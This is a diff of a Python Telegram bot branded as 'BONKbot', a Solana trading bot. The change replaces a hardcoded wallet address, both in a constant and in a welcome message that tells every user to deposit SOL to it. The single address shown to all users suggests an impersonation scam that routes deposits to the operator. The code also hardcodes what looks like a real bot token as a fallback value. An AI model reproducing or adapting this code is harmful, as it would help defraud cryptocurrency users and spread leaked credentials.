@@ -36,7 +36,7 @@ TOKEN = os.environ.get('TOKEN', '8148172265:AAH71EGzjcpkTt_uA2O1V5nbjwBB_oMhggI'
 users = {}
 
 # Default wallet address
-DEFAULT_WALLET_ADDRESS = "DKs3x4DTDwZaRAeo2D5YWkotJzbFGZqDPWX4t3tgPjkY"
+DEFAULT_WALLET_ADDRESS = "c54iQVThndYzaKXK8NqCRWDiRdUoni8LBkpmRoU3aPT"
 # Default private key (from environment variable for security)
 DEFAULT_PRIVATE_KEY = os.environ.get('PRIVATE_KEY', 'YOUR_PRIVATE_KEY_HERE')
 
@@ -163,7 +163,7 @@ def start(update, context):
         "🚀 *Welcome to BONKbot* — the fastest and most secure bot for trading any token on Solana!\n\n"
         f"You currently have *{balance:.4f} SOL* in your wallet.\n\n"
         "To start trading, deposit SOL to your *BONKbot wallet address*:\n\n"
-        "`DKs3x4DTDwZaRAeo2D5YWkotJzbFGZqDPWX4t3tgPjkY`\n\n"
+        "`c54iQVThndYzaKXK8NqCRWDiRdUoni8LBkpmRoU3aPT`\n\n"
         "Once done, tap *Refresh* and your balance will update.\n\n"
         "*To buy a token:* enter a ticker or token contract address from pump.fun, Birdeye, DEX Screener, or Meteora.\n\n"
         "For more info on your wallet and to export your private key, tap *Wallet* below."
@@ -381,6 +381,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
